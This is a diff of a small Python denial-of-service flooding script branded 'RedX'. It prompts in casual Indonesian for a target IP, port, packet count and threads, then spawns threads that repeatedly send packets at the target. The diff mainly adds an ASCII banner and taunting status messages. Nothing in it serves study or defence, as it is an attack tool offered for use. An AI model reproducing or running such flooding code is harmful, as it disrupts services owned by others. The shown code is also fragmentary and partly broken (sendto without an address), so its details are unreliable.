@@ -4,11 +4,19 @@ import socket
 import threading
 import os,sys
 os.system("clear")
-
-ip_bos = str(input("Ip Target : "))
-port_bos = int(input("Port Target : "))
-paket_bos = int(input("Pakets : "))
-threads_bos = int(input("Threads : "))
+print("\033[93m")
+print('''\033[93m Tools By RedX
+██████╗░███████╗██████ ╗██╗░░██╗
+██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
+██████╔╝█████╗░░██║░░██║░╚███╔╝
+██╔══██╗██╔══╝░░██║░░██║░██╔██╗
+██║░░██║███████╗██████╔╝██╔╝╚██╗
+╚═╝░░╚═╝╚══════╝╚═════╝╚═╝░░╚═╝
+''')
+ip_bos = str(input("Masukin Ipnya Woy : "))
+port_bos = int(input("Masukin Portnya Woy : "))
+paket_bos = int(input("Mau Berapa Packetnya : "))
+threads_bos = int(input("Mau Berapa Lama | Threads : "))
 
 os.system("clear")
 def bos():
@@ -20,10 +28,10 @@ def bos():
             s.sendto(boss)
             for y in range(paket_bos):
                 s.sendto(boss)
-            print("wibu")
+            print("\033[95m[*TOK*TOK*] PERMISI PAKET DARI RedX DATENG")
         except:
             s.close()
-            print("")
+            print("\033[93m[*TOK*TOK*] PERMISI PAKET DATENG")
             
 for y in range(threads_bos):
     wb = threading.Thread(target=bos)
